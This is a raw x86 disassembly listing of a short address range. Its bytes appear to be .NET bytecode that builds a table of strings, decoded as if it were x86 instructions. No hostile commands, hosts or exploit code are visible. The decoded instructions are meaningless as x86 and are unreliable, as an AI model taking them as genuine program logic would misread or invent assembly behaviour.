  403b2d:	28 17                	sub    %dl,(%edi)
  403b2f:	00 00                	add    %al,(%eax)
  403b31:	0a 2d 26 07 28 17    	or     0x17280726,%ch
  403b37:	00 00                	add    %al,(%eax)
  403b39:	0a 2c 1e             	or     (%esi,%ebx,1),%ch
  403b3c:	07                   	pop    %es
  403b3d:	73 e7                	jae    0x403b26
  403b3f:	00 00                	add    %al,(%eax)
  403b41:	0a 25 06 72 3d 01    	or     0x13d7206,%ah
  403b47:	00 70 28             	add    %dh,0x28(%eax)
  403b4a:	14 00                	adc    $0x0,%al
  403b4c:	00 0a                	add    %cl,(%edx)
  403b4e:	6f                   	outsl  %ds:(%esi),(%dx)
  403b4f:	e8 00 00 0a 28       	call   0x284a3b54
  403b54:	d7                   	xlat   %ds:(%ebx)
  403b55:	00 00                	add    %al,(%eax)
  403b57:	0a 26                	or     (%esi),%ah
  403b59:	2a 28                	sub    (%eax),%ch
  403b5b:	e9 00 00 0a 16       	jmp    0x164a3b60
  403b60:	28 ea                	sub    %ch,%dl
  403b62:	00 00                	add    %al,(%eax)
  403b64:	0a 73 1e             	or     0x1e(%ebx),%dh
  403b67:	00 00                	add    %al,(%eax)
  403b69:	06                   	push   %es
  403b6a:	28 eb                	sub    %ch,%bl
  403b6c:	00 00                	add    %al,(%eax)
  403b6e:	0a 2a                	or     (%edx),%ch
  403b70:	13 30                	adc    (%eax),%esi
  403b72:	07                   	pop    %es
  403b73:	00 0b                	add    %cl,(%ebx)
  403b75:	06                   	push   %es
  403b76:	00 00                	add    %al,(%eax)
  403b78:	12 00                	adc    (%eax),%al
  403b7a:	00 11                	add    %dl,(%ecx)
  403b7c:	72 83                	jb     0x403b01
  403b7e:	06                   	push   %es
  403b7f:	00 70 80             	add    %dh,-0x80(%eax)
  403b82:	42                   	inc    %edx
  403b83:	00 00                	add    %al,(%eax)
  403b85:	04 72                	add    $0x72,%al
  403b87:	9b                   	fwait
  403b88:	06                   	push   %es
  403b89:	00 70 80             	add    %dh,-0x80(%eax)
  403b8c:	43                   	inc    %ebx
  403b8d:	00 00                	add    %al,(%eax)
  403b8f:	04 72                	add    $0x72,%al
  403b91:	a9 06 00 70 80       	test   $0x80700006,%eax
  403b96:	44                   	inc    %esp
  403b97:	00 00                	add    %al,(%eax)
  403b99:	04 72                	add    $0x72,%al
  403b9b:	d1 06                	roll   $1,(%esi)
  403b9d:	00 70 80             	add    %dh,-0x80(%eax)
  403ba0:	45                   	inc    %ebp
  403ba1:	00 00                	add    %al,(%eax)
  403ba3:	04 72                	add    $0x72,%al
  403ba5:	e5 06                	in     $0x6,%eax
  403ba7:	00 70 80             	add    %dh,-0x80(%eax)
  403baa:	46                   	inc    %esi
  403bab:	00 00                	add    %al,(%eax)
  403bad:	04 72                	add    $0x72,%al
  403baf:	07                   	pop    %es
  403bb0:	07                   	pop    %es
  403bb1:	00 70 80             	add    %dh,-0x80(%eax)
  403bb4:	47                   	inc    %edi
  403bb5:	00 00                	add    %al,(%eax)
  403bb7:	04 72                	add    $0x72,%al
  403bb9:	13 07                	adc    (%edi),%eax
  403bbb:	00 70 80             	add    %dh,-0x80(%eax)
  403bbe:	48                   	dec    %eax
  403bbf:	00 00                	add    %al,(%eax)
  403bc1:	04 73                	add    $0x73,%al
  403bc3:	ed                   	in     (%dx),%eax
  403bc4:	00 00                	add    %al,(%eax)
  403bc6:	0a 25 72 33 07 00    	or     0x73372,%ah
  403bcc:	70 73                	jo     0x403c41
  403bce:	ee                   	out    %al,(%dx)
  403bcf:	00 00                	add    %al,(%eax)
  403bd1:	0a 25 7e 42 00 00    	or     0x427e,%ah
  403bd7:	04 72                	add    $0x72,%al
  403bd9:	39 07                	cmp    %eax,(%edi)
  403bdb:	00 70 6f             	add    %dh,0x6f(%eax)
  403bde:	ef                   	out    %eax,(%dx)
  403bdf:	00 00                	add    %al,(%eax)
  403be1:	0a 25 7e 43 00 00    	or     0x437e,%ah
  403be7:	04 72                	add    $0x72,%al
  403be9:	fd                   	std
  403bea:	05 00 70 6f ef       	add    $0xef6f7000,%eax
  403bef:	00 00                	add    %al,(%eax)
  403bf1:	0a 25 7e 44 00 00    	or     0x447e,%ah
  403bf7:	04 72                	add    $0x72,%al
  403bf9:	53                   	push   %ebx
  403bfa:	07                   	pop    %es
  403bfb:	00 70 6f             	add    %dh,0x6f(%eax)
  403bfe:	ef                   	out    %eax,(%dx)
  403bff:	00 00                	add    %al,(%eax)
  403c01:	0a 25 7e 45 00 00    	or     0x457e,%ah
  403c07:	04 72                	add    $0x72,%al
  403c09:	a9 07 00 70 6f       	test   $0x6f700007,%eax
  403c0e:	ef                   	out    %eax,(%dx)
  403c0f:	00 00                	add    %al,(%eax)
  403c11:	0a 25 7e 46 00 00    	or     0x467e,%ah
  403c17:	04 72                	add    $0x72,%al
  403c19:	c4 04 00             	les    (%eax,%eax,1),%eax
  403c1c:	70 6f                	jo     0x403c8d
  403c1e:	ef                   	out    %eax,(%dx)
  403c1f:	00 00                	add    %al,(%eax)
  403c21:	0a 25 7e 47 00 00    	or     0x477e,%ah
  403c27:	04 72                	add    $0x72,%al
  403c29:	db 05 00 70 6f ef    	fildl  0xef6f7000
  403c2f:	00 00                	add    %al,(%eax)
  403c31:	0a 25 7e 48 00 00    	or     0x487e,%ah
  403c37:	04 72                	add    $0x72,%al
  403c39:	a3 05 00 70 6f       	mov    %eax,0x6f700005
  403c3e:	ef                   	out    %eax,(%dx)
  403c3f:	00 00                	add    %al,(%eax)
  403c41:	0a 6f f0             	or     -0x10(%edi),%ch
  403c44:	00 00                	add    %al,(%eax)
  403c46:	0a 25 72 11 08 00    	or     0x81172,%ah
  403c4c:	70 73                	jo     0x403cc1
  403c4e:	ee                   	out    %al,(%dx)
  403c4f:	00 00                	add    %al,(%eax)
  403c51:	0a 25 7e 42 00 00    	or     0x427e,%ah
  403c57:	04 72                	add    $0x72,%al
  403c59:	17                   	pop    %ss
  403c5a:	08 00                	or     %al,(%eax)
  403c5c:	70 6f                	jo     0x403ccd
  403c5e:	ef                   	out    %eax,(%dx)
  403c5f:	00 00                	add    %al,(%eax)
  403c61:	0a 25 7e 43 00 00    	or     0x437e,%ah
  403c67:	04 72                	add    $0x72,%al
  403c69:	29 08                	sub    %ecx,(%eax)
  403c6b:	00 70 6f             	add    %dh,0x6f(%eax)
  403c6e:	ef                   	out    %eax,(%dx)
  403c6f:	00 00                	add    %al,(%eax)
  403c71:	0a 25 7e 44 00 00    	or     0x447e,%ah
  403c77:	04 72                	add    $0x72,%al
  403c79:	2f                   	das
  403c7a:	08 00                	or     %al,(%eax)
  403c7c:	70 6f                	jo     0x403ced
  403c7e:	ef                   	out    %eax,(%dx)
  403c7f:	00 00                	add    %al,(%eax)
  403c81:	0a 25 7e 45 00 00    	or     0x457e,%ah
  403c87:	04 72                	add    $0x72,%al
  403c89:	45                   	inc    %ebp
  403c8a:	08 00                	or     %al,(%eax)
  403c8c:	70 6f                	jo     0x403cfd
  403c8e:	ef                   	out    %eax,(%dx)
  403c8f:	00 00                	add    %al,(%eax)
  403c91:	0a 25 7e 46 00 00    	or     0x467e,%ah
  403c97:	04 72                	add    $0x72,%al
  403c99:	6d                   	insl   (%dx),%es:(%edi)
  403c9a:	08 00                	or     %al,(%eax)
  403c9c:	70 6f                	jo     0x403d0d
  403c9e:	ef                   	out    %eax,(%dx)
  403c9f:	00 00                	add    %al,(%eax)
  403ca1:	0a 25 7e 47 00 00    	or     0x477e,%ah
  403ca7:	04 72                	add    $0x72,%al
  403ca9:	9f                   	lahf
  403caa:	08 00                	or     %al,(%eax)
  403cac:	70 6f                	jo     0x403d1d
  403cae:	ef                   	out    %eax,(%dx)
  403caf:	00 00                	add    %al,(%eax)
  403cb1:	0a 25 7e 48 00 00    	or     0x487e,%ah
  403cb7:	04 72                	add    $0x72,%al
  403cb9:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403cba:	08 00                	or     %al,(%eax)
  403cbc:	70 6f                	jo     0x403d2d
  403cbe:	ef                   	out    %eax,(%dx)
  403cbf:	00 00                	add    %al,(%eax)
  403cc1:	0a 6f f0             	or     -0x10(%edi),%ch
  403cc4:	00 00                	add    %al,(%eax)
  403cc6:	0a 25 72 af 08 00    	or     0x8af72,%ah
  403ccc:	70 73                	jo     0x403d41
  403cce:	ee                   	out    %al,(%dx)
  403ccf:	00 00                	add    %al,(%eax)
  403cd1:	0a 25 7e 42 00 00    	or     0x427e,%ah
  403cd7:	04 72                	add    $0x72,%al
  403cd9:	39 07                	cmp    %eax,(%edi)
  403cdb:	00 70 6f             	add    %dh,0x6f(%eax)
  403cde:	ef                   	out    %eax,(%dx)
  403cdf:	00 00                	add    %al,(%eax)
  403ce1:	0a 25 7e 43 00 00    	or     0x437e,%ah
  403ce7:	04 72                	add    $0x72,%al
  403ce9:	b5 08                	mov    $0x8,%ch
  403ceb:	00 70 6f             	add    %dh,0x6f(%eax)
  403cee:	ef                   	out    %eax,(%dx)
  403cef:	00 00                	add    %al,(%eax)
  403cf1:	0a 25 7e 44 00 00    	or     0x447e,%ah
  403cf7:	04 72                	add    $0x72,%al
  403cf9:	c7                   	(bad)
  403cfa:	08 00                	or     %al,(%eax)
  403cfc:	70 6f                	jo     0x403d6d
  403cfe:	ef                   	out    %eax,(%dx)
  403cff:	00 00                	add    %al,(%eax)
  403d01:	0a 25 7e 45 00 00    	or     0x457e,%ah
  403d07:	04 72                	add    $0x72,%al
  403d09:	33 09                	xor    (%ecx),%ecx
  403d0b:	00 70 6f             	add    %dh,0x6f(%eax)
  403d0e:	ef                   	out    %eax,(%dx)
  403d0f:	00 00                	add    %al,(%eax)
  403d11:	0a 25 7e 46 00 00    	or     0x467e,%ah
  403d17:	04 72                	add    $0x72,%al
  403d19:	a3 09 00 70 6f       	mov    %eax,0x6f700009
  403d1e:	ef                   	out    %eax,(%dx)
  403d1f:	00 00                	add    %al,(%eax)
  403d21:	0a 25 7e 47 00 00    	or     0x477e,%ah
  403d27:	04 72                	add    $0x72,%al
  403d29:	4e                   	dec    %esi
  403d2a:	0a 00                	or     (%eax),%al
  403d2c:	70 6f                	jo     0x403d9d
  403d2e:	ef                   	out    %eax,(%dx)
  403d2f:	00 00                	add    %al,(%eax)
  403d31:	0a 25 7e 48 00 00    	or     0x487e,%ah
  403d37:	04 72                	add    $0x72,%al
  403d39:	66 0a 00             	data16 or (%eax),%al
  403d3c:	70 6f                	jo     0x403dad
  403d3e:	ef                   	out    %eax,(%dx)
  403d3f:	00 00                	add    %al,(%eax)
  403d41:	0a 6f f0             	or     -0x10(%edi),%ch
  403d44:	00 00                	add    %al,(%eax)
  403d46:	0a 25 72 8c 0a 00    	or     0xa8c72,%ah
  403d4c:	70 73                	jo     0x403dc1
  403d4e:	ee                   	out    %al,(%dx)
  403d4f:	00 00                	add    %al,(%eax)
  403d51:	0a 25 7e 42 00 00    	or     0x427e,%ah
  403d57:	04 72                	add    $0x72,%al
  403d59:	39 07                	cmp    %eax,(%edi)
  403d5b:	00 70 6f             	add    %dh,0x6f(%eax)
  403d5e:	ef                   	out    %eax,(%dx)
  403d5f:	00 00                	add    %al,(%eax)
  403d61:	0a 25 7e 43 00 00    	or     0x437e,%ah
  403d67:	04 72                	add    $0x72,%al
  403d69:	92                   	xchg   %eax,%edx
  403d6a:	0a 00                	or     (%eax),%al
  403d6c:	70 6f                	jo     0x403ddd
  403d6e:	ef                   	out    %eax,(%dx)
  403d6f:	00 00                	add    %al,(%eax)
  403d71:	0a 25 7e 44 00 00    	or     0x447e,%ah
  403d77:	04 72                	add    $0x72,%al
  403d79:	a2 0a 00 70 6f       	mov    %al,0x6f70000a
  403d7e:	ef                   	out    %eax,(%dx)
  403d7f:	00 00                	add    %al,(%eax)
  403d81:	0a 25 7e 45 00 00    	or     0x457e,%ah
  403d87:	04 72                	add    $0x72,%al
  403d89:	00 0b                	add    %cl,(%ebx)
  403d8b:	00 70 6f             	add    %dh,0x6f(%eax)
  403d8e:	ef                   	out    %eax,(%dx)
  403d8f:	00 00                	add    %al,(%eax)
  403d91:	0a 25 7e 46 00 00    	or     0x467e,%ah
  403d97:	04 72                	add    $0x72,%al
  403d99:	7e 0b                	jle    0x403da6
  403d9b:	00 70 6f             	add    %dh,0x6f(%eax)
  403d9e:	ef                   	out    %eax,(%dx)
  403d9f:	00 00                	add    %al,(%eax)
  403da1:	0a 25 7e 47 00 00    	or     0x477e,%ah
  403da7:	04 72                	add    $0x72,%al
  403da9:	37                   	aaa
  403daa:	0c 00                	or     $0x0,%al
  403dac:	70 6f                	jo     0x403e1d
  403dae:	ef                   	out    %eax,(%dx)
  403daf:	00 00                	add    %al,(%eax)
  403db1:	0a 25 7e 48 00 00    	or     0x487e,%ah
  403db7:	04 72                	add    $0x72,%al
  403db9:	4b                   	dec    %ebx
  403dba:	0c 00                	or     $0x0,%al
  403dbc:	70 6f                	jo     0x403e2d
  403dbe:	ef                   	out    %eax,(%dx)
  403dbf:	00 00                	add    %al,(%eax)
  403dc1:	0a 6f f0             	or     -0x10(%edi),%ch
  403dc4:	00 00                	add    %al,(%eax)
  403dc6:	0a 25 72 77 0c 00    	or     0xc7772,%ah
  403dcc:	70 73                	jo     0x403e41
  403dce:	ee                   	out    %al,(%dx)
  403dcf:	00 00                	add    %al,(%eax)
  403dd1:	0a 25 7e 42 00 00    	or     0x427e,%ah
  403dd7:	04 72                	add    $0x72,%al
  403dd9:	7d 0c                	jge    0x403de7
  403ddb:	00 70 6f             	add    %dh,0x6f(%eax)
  403dde:	ef                   	out    %eax,(%dx)
  403ddf:	00 00                	add    %al,(%eax)
  403de1:	0a 25 7e 43 00 00    	or     0x437e,%ah
  403de7:	04 72                	add    $0x72,%al
  403de9:	a9 0c 00 70 6f       	test   $0x6f70000c,%eax
  403dee:	ef                   	out    %eax,(%dx)
  403def:	00 00                	add    %al,(%eax)
  403df1:	0a 25 7e 44 00 00    	or     0x447e,%ah
  403df7:	04 72                	add    $0x72,%al
  403df9:	bb 0c 00 70 6f       	mov    $0x6f70000c,%ebx
  403dfe:	ef                   	out    %eax,(%dx)
  403dff:	00 00                	add    %al,(%eax)
  403e01:	0a 25 7e 45 00 00    	or     0x457e,%ah
  403e07:	04 72                	add    $0x72,%al
  403e09:	13 0d 00 70 6f ef    	adc    0xef6f7000,%ecx
  403e0f:	00 00                	add    %al,(%eax)
  403e11:	0a 25 7e 46 00 00    	or     0x467e,%ah
  403e17:	04 72                	add    $0x72,%al
  403e19:	7d 0d                	jge    0x403e28
  403e1b:	00 70 6f             	add    %dh,0x6f(%eax)
  403e1e:	ef                   	out    %eax,(%dx)
  403e1f:	00 00                	add    %al,(%eax)
  403e21:	0a 25 7e 47 00 00    	or     0x477e,%ah
  403e27:	04 72                	add    $0x72,%al
  403e29:	24 0e                	and    $0xe,%al
  403e2b:	00 70 6f             	add    %dh,0x6f(%eax)
  403e2e:	ef                   	out    %eax,(%dx)
  403e2f:	00 00                	add    %al,(%eax)
  403e31:	0a 25 7e 48 00 00    	or     0x487e,%ah
  403e37:	04 72                	add    $0x72,%al
  403e39:	3a 0e                	cmp    (%esi),%cl
  403e3b:	00 70 6f             	add    %dh,0x6f(%eax)
  403e3e:	ef                   	out    %eax,(%dx)
  403e3f:	00 00                	add    %al,(%eax)
  403e41:	0a 6f f0             	or     -0x10(%edi),%ch
  403e44:	00 00                	add    %al,(%eax)
  403e46:	0a 25 72 5a 0e 00    	or     0xe5a72,%ah
  403e4c:	70 73                	jo     0x403ec1
  403e4e:	ee                   	out    %al,(%dx)
  403e4f:	00 00                	add    %al,(%eax)
  403e51:	0a 25 7e 42 00 00    	or     0x427e,%ah
  403e57:	04 72                	add    $0x72,%al
  403e59:	60                   	pusha
  403e5a:	0e                   	push   %cs
  403e5b:	00 70 6f             	add    %dh,0x6f(%eax)
  403e5e:	ef                   	out    %eax,(%dx)
  403e5f:	00 00                	add    %al,(%eax)
  403e61:	0a 25 7e 43 00 00    	or     0x437e,%ah
  403e67:	04 72                	add    $0x72,%al
  403e69:	a9 0c 00 70 6f       	test   $0x6f70000c,%eax
  403e6e:	ef                   	out    %eax,(%dx)
  403e6f:	00 00                	add    %al,(%eax)
  403e71:	0a 25 7e 44 00 00    	or     0x447e,%ah
  403e77:	04 72                	add    $0x72,%al
  403e79:	8a 0e                	mov    (%esi),%cl
  403e7b:	00 70 6f             	add    %dh,0x6f(%eax)
  403e7e:	ef                   	out    %eax,(%dx)
  403e7f:	00 00                	add    %al,(%eax)
  403e81:	0a 25 7e 45 00 00    	or     0x457e,%ah
  403e87:	04 72                	add    $0x72,%al
  403e89:	e6 0e                	out    %al,$0xe
  403e8b:	00 70 6f             	add    %dh,0x6f(%eax)
  403e8e:	ef                   	out    %eax,(%dx)
  403e8f:	00 00                	add    %al,(%eax)
  403e91:	0a 25 7e 46 00 00    	or     0x467e,%ah
  403e97:	04 72                	add    $0x72,%al
  403e99:	48                   	dec    %eax
  403e9a:	0f 00                	(bad)
  403e9c:	70 6f                	jo     0x403f0d
  403e9e:	ef                   	out    %eax,(%dx)
  403e9f:	00 00                	add    %al,(%eax)
  403ea1:	0a 25 7e 47 00 00    	or     0x477e,%ah
  403ea7:	04 72                	add    $0x72,%al
  403ea9:	01 10                	add    %edx,(%eax)
  403eab:	00 70 6f             	add    %dh,0x6f(%eax)
  403eae:	ef                   	out    %eax,(%dx)
  403eaf:	00 00                	add    %al,(%eax)
  403eb1:	0a 25 7e 48 00 00    	or     0x487e,%ah
  403eb7:	04 72                	add    $0x72,%al
  403eb9:	11 10                	adc    %edx,(%eax)
  403ebb:	00 70 6f             	add    %dh,0x6f(%eax)
  403ebe:	ef                   	out    %eax,(%dx)
  403ebf:	00 00                	add    %al,(%eax)
  403ec1:	0a 6f f0             	or     -0x10(%edi),%ch
  403ec4:	00 00                	add    %al,(%eax)
  403ec6:	0a 25 72 31 10 00    	or     0x103172,%ah
  403ecc:	70 73                	jo     0x403f41
  403ece:	ee                   	out    %al,(%dx)
  403ecf:	00 00                	add    %al,(%eax)
  403ed1:	0a 25 7e 42 00 00    	or     0x427e,%ah
  403ed7:	04 72                	add    $0x72,%al
  403ed9:	37                   	aaa
  403eda:	10 00                	adc    %al,(%eax)
  403edc:	70 6f                	jo     0x403f4d
  403ede:	ef                   	out    %eax,(%dx)
  403edf:	00 00                	add    %al,(%eax)
  403ee1:	0a 25 7e 43 00 00    	or     0x437e,%ah
  403ee7:	04 72                	add    $0x72,%al
  403ee9:	57                   	push   %edi
  403eea:	10 00                	adc    %al,(%eax)
  403eec:	70 6f                	jo     0x403f5d
  403eee:	ef                   	out    %eax,(%dx)
  403eef:	00 00                	add    %al,(%eax)
  403ef1:	0a 25 7e 44 00 00    	or     0x447e,%ah
  403ef7:	04 72                	add    $0x72,%al
  403ef9:	65 10 00             	adc    %al,%gs:(%eax)
  403efc:	70 6f                	jo     0x403f6d
  403efe:	ef                   	out    %eax,(%dx)
  403eff:	00 00                	add    %al,(%eax)
  403f01:	0a 25 7e 45 00 00    	or     0x457e,%ah
  403f07:	04 72                	add    $0x72,%al
  403f09:	c1 10 00             	rcll   $0x0,(%eax)
  403f0c:	70 6f                	jo     0x403f7d
  403f0e:	ef                   	out    %eax,(%dx)
  403f0f:	00 00                	add    %al,(%eax)
  403f11:	0a 25 7e 46 00 00    	or     0x467e,%ah
  403f17:	04 72                	add    $0x72,%al
  403f19:	4c                   	dec    %esp
  403f1a:	11 00                	adc    %eax,(%eax)
  403f1c:	70 6f                	jo     0x403f8d
  403f1e:	ef                   	out    %eax,(%dx)
  403f1f:	00 00                	add    %al,(%eax)
  403f21:	0a 25 7e 47 00 00    	or     0x477e,%ah
  403f27:	04 72                	add    $0x72,%al
  403f29:	ff 11                	call   *(%ecx)
  403f2b:	00 70 6f             	add    %dh,0x6f(%eax)
  403f2e:	ef                   	out    %eax,(%dx)
  403f2f:	00 00                	add    %al,(%eax)
  403f31:	0a 25 7e 48 00 00    	or     0x487e,%ah
  403f37:	04 72                	add    $0x72,%al
  403f39:	17                   	pop    %ss
  403f3a:	12 00                	adc    (%eax),%al
  403f3c:	70 6f                	jo     0x403fad
  403f3e:	ef                   	out    %eax,(%dx)
  403f3f:	00 00                	add    %al,(%eax)
  403f41:	0a 6f f0             	or     -0x10(%edi),%ch
  403f44:	00 00                	add    %al,(%eax)
  403f46:	0a 25 72 35 12 00    	or     0x123572,%ah
  403f4c:	70 73                	jo     0x403fc1
  403f4e:	ee                   	out    %al,(%dx)
  403f4f:	00 00                	add    %al,(%eax)
  403f51:	0a 25 7e 42 00 00    	or     0x427e,%ah
  403f57:	04 72                	add    $0x72,%al
  403f59:	3b 12                	cmp    (%edx),%edx
  403f5b:	00 70 6f             	add    %dh,0x6f(%eax)
  403f5e:	ef                   	out    %eax,(%dx)
  403f5f:	00 00                	add    %al,(%eax)
  403f61:	0a 25 7e 43 00 00    	or     0x437e,%ah
  403f67:	04 72                	add    $0x72,%al
  403f69:	4d                   	dec    %ebp
  403f6a:	12 00                	adc    (%eax),%al
  403f6c:	70 6f                	jo     0x403fdd
  403f6e:	ef                   	out    %eax,(%dx)
  403f6f:	00 00                	add    %al,(%eax)
  403f71:	0a 25 7e 44 00 00    	or     0x447e,%ah
  403f77:	04 72                	add    $0x72,%al
  403f79:	59                   	pop    %ecx
  403f7a:	12 00                	adc    (%eax),%al
  403f7c:	70 6f                	jo     0x403fed
  403f7e:	ef                   	out    %eax,(%dx)
  403f7f:	00 00                	add    %al,(%eax)
  403f81:	0a 25 7e 45 00 00    	or     0x457e,%ah
  403f87:	04 72                	add    $0x72,%al
  403f89:	81 12 00 70 6f ef    	adcl   $0xef6f7000,(%edx)
  403f8f:	00 00                	add    %al,(%eax)
  403f91:	0a 25 7e 46 00 00    	or     0x467e,%ah
  403f97:	04 72                	add    $0x72,%al
  403f99:	c5 12                	lds    (%edx),%edx
  403f9b:	00 70 6f             	add    %dh,0x6f(%eax)
  403f9e:	ef                   	out    %eax,(%dx)
  403f9f:	00 00                	add    %al,(%eax)
  403fa1:	0a 25 7e 47 00 00    	or     0x477e,%ah
  403fa7:	04 72                	add    $0x72,%al
  403fa9:	11 13                	adc    %edx,(%ebx)
  403fab:	00 70 6f             	add    %dh,0x6f(%eax)
  403fae:	ef                   	out    %eax,(%dx)
  403faf:	00 00                	add    %al,(%eax)
  403fb1:	0a 25 7e 48 00 00    	or     0x487e,%ah
  403fb7:	04 72                	add    $0x72,%al
  403fb9:	19 13                	sbb    %edx,(%ebx)
  403fbb:	00 70 6f             	add    %dh,0x6f(%eax)
  403fbe:	ef                   	out    %eax,(%dx)
  403fbf:	00 00                	add    %al,(%eax)
  403fc1:	0a 6f f0             	or     -0x10(%edi),%ch
  403fc4:	00 00                	add    %al,(%eax)
  403fc6:	0a 25 72 2b 13 00    	or     0x132b72,%ah
  403fcc:	70 73                	jo     0x404041
  403fce:	ee                   	out    %al,(%dx)
  403fcf:	00 00                	add    %al,(%eax)
  403fd1:	0a 25 7e 42 00 00    	or     0x427e,%ah
  403fd7:	04 72                	add    $0x72,%al
  403fd9:	31 13                	xor    %edx,(%ebx)
  403fdb:	00 70 6f             	add    %dh,0x6f(%eax)
  403fde:	ef                   	out    %eax,(%dx)
  403fdf:	00 00                	add    %al,(%eax)
  403fe1:	0a 25 7e 43 00 00    	or     0x437e,%ah
  403fe7:	04 72                	add    $0x72,%al
  403fe9:	45                   	inc    %ebp
  403fea:	13 00                	adc    (%eax),%eax
  403fec:	70 6f                	jo     0x40405d
  403fee:	ef                   	out    %eax,(%dx)
  403fef:	00 00                	add    %al,(%eax)
  403ff1:	0a 25 7e 44 00 00    	or     0x447e,%ah
  403ff7:	04 72                	add    $0x72,%al
  403ff9:	4b                   	dec    %ebx
  403ffa:	13 00                	adc    (%eax),%eax
  403ffc:	70 6f                	jo     0x40406d
  403ffe:	ef                   	out    %eax,(%dx)
  403fff:	00 00                	add    %al,(%eax)
  404001:	0a 25 7e 45 00 00    	or     0x457e,%ah
  404007:	04 72                	add    $0x72,%al
  404009:	61                   	popa
  40400a:	13 00                	adc    (%eax),%eax
  40400c:	70 6f                	jo     0x40407d
  40400e:	ef                   	out    %eax,(%dx)
  40400f:	00 00                	add    %al,(%eax)
  404011:	0a 25 7e 46 00 00    	or     0x467e,%ah
  404017:	04 72                	add    $0x72,%al
  404019:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40401a:	13 00                	adc    (%eax),%eax
  40401c:	70 6f                	jo     0x40408d
  40401e:	ef                   	out    %eax,(%dx)
  40401f:	00 00                	add    %al,(%eax)
  404021:	0a 25 7e 47 00 00    	or     0x477e,%ah
  404027:	04 72                	add    $0x72,%al
  404029:	fd                   	std
  40402a:	13 00                	adc    (%eax),%eax
  40402c:	70 6f                	jo     0x40409d
  40402e:	ef                   	out    %eax,(%dx)
  40402f:	00 00                	add    %al,(%eax)
  404031:	0a 25 7e 48 00 00    	or     0x487e,%ah
  404037:	04 72                	add    $0x72,%al
  404039:	09 14 00             	or     %edx,(%eax,%eax,1)
  40403c:	70 6f                	jo     0x4040ad
  40403e:	ef                   	out    %eax,(%dx)
  40403f:	00 00                	add    %al,(%eax)
  404041:	0a 6f f0             	or     -0x10(%edi),%ch
  404044:	00 00                	add    %al,(%eax)
  404046:	0a 25 72 19 14 00    	or     0x141972,%ah
  40404c:	70 73                	jo     0x4040c1
  40404e:	ee                   	out    %al,(%dx)
  40404f:	00 00                	add    %al,(%eax)
  404051:	0a 25 7e 42 00 00    	or     0x427e,%ah
  404057:	04 72                	add    $0x72,%al
  404059:	1f                   	pop    %ds
  40405a:	14 00                	adc    $0x0,%al
  40405c:	70 6f                	jo     0x4040cd
  40405e:	ef                   	out    %eax,(%dx)
  40405f:	00 00                	add    %al,(%eax)
  404061:	0a 25 7e 43 00 00    	or     0x437e,%ah
  404067:	04 72                	add    $0x72,%al
  404069:	47                   	inc    %edi
  40406a:	14 00                	adc    $0x0,%al
  40406c:	70 6f                	jo     0x4040dd
  40406e:	ef                   	out    %eax,(%dx)
  40406f:	00 00                	add    %al,(%eax)
  404071:	0a 25 7e 44 00 00    	or     0x447e,%ah
  404077:	04 72                	add    $0x72,%al
  404079:	55                   	push   %ebp
  40407a:	14 00                	adc    $0x0,%al
  40407c:	70 6f                	jo     0x4040ed
  40407e:	ef                   	out    %eax,(%dx)
  40407f:	00 00                	add    %al,(%eax)
  404081:	0a 25 7e 45 00 00    	or     0x457e,%ah
  404087:	04 72                	add    $0x72,%al
  404089:	ab                   	stos   %eax,%es:(%edi)
  40408a:	14 00                	adc    $0x0,%al
  40408c:	70 6f                	jo     0x4040fd
  40408e:	ef                   	out    %eax,(%dx)
  40408f:	00 00                	add    %al,(%eax)
  404091:	0a 25 7e 46 00 00    	or     0x467e,%ah
  404097:	04 72                	add    $0x72,%al
  404099:	2b 15 00 70 6f ef    	sub    0xef6f7000,%edx
  40409f:	00 00                	add    %al,(%eax)
  4040a1:	0a 25 7e 47 00 00    	or     0x477e,%ah
  4040a7:	04 72                	add    $0x72,%al
  4040a9:	dc 15 00 70 6f ef    	fcoml  0xef6f7000
  4040af:	00 00                	add    %al,(%eax)
  4040b1:	0a 25 7e 48 00 00    	or     0x487e,%ah
  4040b7:	04 72                	add    $0x72,%al
  4040b9:	f4                   	hlt
  4040ba:	15 00 70 6f ef       	adc    $0xef6f7000,%eax
  4040bf:	00 00                	add    %al,(%eax)
  4040c1:	0a 6f f0             	or     -0x10(%edi),%ch
  4040c4:	00 00                	add    %al,(%eax)
  4040c6:	0a 80 49 00 00 04    	or     0x4000049(%eax),%al
  4040cc:	28 43 00             	sub    %al,0x0(%ebx)
  4040cf:	00 06                	add    %al,(%esi)
  4040d1:	0b 12                	or     (%edx),%edx
  4040d3:	00 7e 49             	add    %bh,0x49(%esi)
  4040d6:	00 00                	add    %al,(%eax)
  4040d8:	04 72                	add    $0x72,%al
  4040da:	33 07                	xor    (%edi),%eax
  4040dc:	00 70 6f             	add    %dh,0x6f(%eax)
  4040df:	f1                   	int1
  4040e0:	00 00                	add    %al,(%eax)
  4040e2:	0a 7d 4b             	or     0x4b(%ebp),%bh
  4040e5:	00 00                	add    %al,(%eax)
  4040e7:	04 7e                	add    $0x7e,%al
  4040e9:	49                   	dec    %ecx
  4040ea:	00 00                	add    %al,(%eax)
  4040ec:	04 07                	add    $0x7,%al
  4040ee:	12 00                	adc    (%eax),%al
  4040f0:	7c 4a                	jl     0x40413c
  4040f2:	00 00                	add    %al,(%eax)
  4040f4:	04 6f                	add    $0x6f,%al
  4040f6:	f2 00 00             	repnz add %al,(%eax)
  4040f9:	0a 2d 0d 12 00 06    	or     0x600120d,%ch
  4040ff:	7b 4b                	jnp    0x40414c
  404101:	00 00                	add    %al,(%eax)
  404103:	04 7d                	add    $0x7d,%al
  404105:	4a                   	dec    %edx
  404106:	00 00                	add    %al,(%eax)
  404108:	04 7e                	add    $0x7e,%al
  40410a:	42                   	inc    %edx
  40410b:	00 00                	add    %al,(%eax)
  40410d:	04 12                	add    $0x12,%al
  40410f:	00 28                	add    %ch,(%eax)
  404111:	44                   	inc    %esp
  404112:	00 00                	add    %al,(%eax)
  404114:	06                   	push   %es
  404115:	80 42 00 00          	addb   $0x0,0x0(%edx)
  404119:	04 7e                	add    $0x7e,%al
  40411b:	43                   	inc    %ebx
  40411c:	00 00                	add    %al,(%eax)
  40411e:	04 12                	add    $0x12,%al
  404120:	00 28                	add    %ch,(%eax)
  404122:	44                   	inc    %esp
  404123:	00 00                	add    %al,(%eax)
  404125:	06                   	push   %es
  404126:	80 43 00 00          	addb   $0x0,0x0(%ebx)
  40412a:	04 7e                	add    $0x7e,%al
  40412c:	44                   	inc    %esp
  40412d:	00 00                	add    %al,(%eax)
